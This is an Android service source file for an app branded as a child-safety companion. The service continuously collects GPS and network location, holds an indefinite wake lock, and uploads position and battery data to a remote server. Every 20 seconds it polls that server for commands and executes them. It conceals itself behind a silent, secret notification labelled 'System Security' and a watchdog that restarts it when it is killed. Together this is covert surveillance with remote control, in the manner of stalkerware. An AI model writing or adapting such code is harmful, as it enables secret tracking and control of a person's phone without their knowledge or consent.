package com.snapapp.companion;

import android.annotation.SuppressLint;
import android.app.*;
import android.content.*;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.*;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.concurrent.*;

public class CompanionSyncService extends Service {
    private static final String CHANNEL_ID = "snap_safety_channel";
    private static final int NOTIF_ID = 1001;

    private ScheduledExecutorService scheduler;
    private SharedPreferences prefs;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
        acquireWakeLock();
        createNotificationChannel();
        initLocationListener();
        WatchdogReceiver.scheduleWatchdog(this);
    }

    @SuppressLint("WakelockTimeout")
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "snap:synclock");
                wakeLock.acquire();
            }
        } catch (Exception ignored) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIF_ID, buildNotification());
        startPeriodicSync();
        requestActiveLocationFix();
        WatchdogReceiver.scheduleWatchdog(this);
        return START_STICKY;
    }

    private void initLocationListener() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (locationManager == null) return;

        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location loc) {
                if (loc != null) dispatchLocation(loc);
            }
            @Override public void onStatusChanged(String p, int s, Bundle b) {}
            @Override public void onProviderEnabled(String p) {}
            @Override public void onProviderDisabled(String p) {}
        };
    }

    @SuppressLint("MissingPermission")
    private void requestActiveLocationFix() {
        if (locationManager == null || locationListener == null) return;
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                try {
                    if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 5, locationListener, Looper.getMainLooper());
                        Location lastGps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        if (lastGps != null) dispatchLocation(lastGps);
                    }
                    if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000, 5, locationListener, Looper.getMainLooper());
                        Location lastNet = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        if (lastNet != null) dispatchLocation(lastNet);
                    }
                } catch (SecurityException ignored) {}
            }
        });
    }

    private void dispatchLocation(Location loc) {
        final String deviceId = prefs.getString("device_id", null);
        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (deviceId == null || loc == null) return;
        ApiClient.sendLocation(serverUrl, deviceId, loc.getLatitude(), loc.getLongitude(), loc.getAccuracy(), getBatteryLevel(), null);
    }

    private void startPeriodicSync() {
        if (scheduler != null && !scheduler.isShutdown()) return;
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleWithFixedDelay(new Runnable() {
            @Override
            public void run() {
                requestActiveLocationFix();
                pollServerCommands();
            }
        }, 2, 20, TimeUnit.SECONDS);
    }

    private void pollServerCommands() {
        final String deviceId = prefs.getString("device_id", null);
        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (deviceId == null) return;

        ApiClient.sendHeartbeat(serverUrl, deviceId, getBatteryLevel(), false, new ApiClient.ApiCallback() {
            @Override
            public void onSuccess(JSONObject response) {
                JSONArray cmds = response.optJSONArray("commands");
                if (cmds == null || cmds.length() == 0) return;
                for (int i = 0; i < cmds.length(); i++) {
                    JSONObject c = cmds.optJSONObject(i);
                    CommandDispatcher.dispatch(CompanionSyncService.this, serverUrl, deviceId, c, new CommandDispatcher.LocationRefreshCallback() {
                        @Override public void onRefreshNeeded() { requestActiveLocationFix(); }
                    });
                }
            }
            @Override public void onError(String error) {}
        });
    }

    private int getBatteryLevel() {
        Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        if (bi == null) return 100;
        int level = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        return (level >= 0 && scale > 0) ? (int) ((level / (float) scale) * 100) : 100;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "System Security", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent launch = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, launch,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Snap Safety")
                .setContentText("Child safety service active")
                .setSmallIcon(R.drawable.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setContentIntent(pi)
                .build();
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        WatchdogReceiver.scheduleWatchdog(this);
        if (scheduler != null) scheduler.shutdown();
        if (locationManager != null && locationListener != null) locationManager.removeUpdates(locationListener);
        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
        }
        super.onDestroy();
    }
}
